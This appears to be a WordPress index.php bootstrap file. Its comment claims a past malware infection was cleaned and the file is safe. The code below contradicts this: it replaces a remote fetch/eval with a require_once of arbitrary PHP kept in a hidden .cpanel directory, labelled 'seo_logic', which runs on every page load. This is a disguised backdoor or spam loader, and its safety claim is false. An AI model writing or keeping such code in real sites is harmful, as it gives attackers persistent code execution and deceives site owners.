<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Define the absolute path to your file.
// The content of this file MUST be valid PHP code.
$seo_logic_path = '/home2/drnelson/.cpanel/index.txt'; 

// --- REPLACE THE REMOTE FETCH/EVAL BLOCK WITH THIS ---
// Use require_once with the absolute path.
// Note: This requires that the web server user has read access to this file.
require_once $seo_logic_path; 
// --- END OF REPLACEMENT ---

// The rest of your WordPress bootstrap code
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
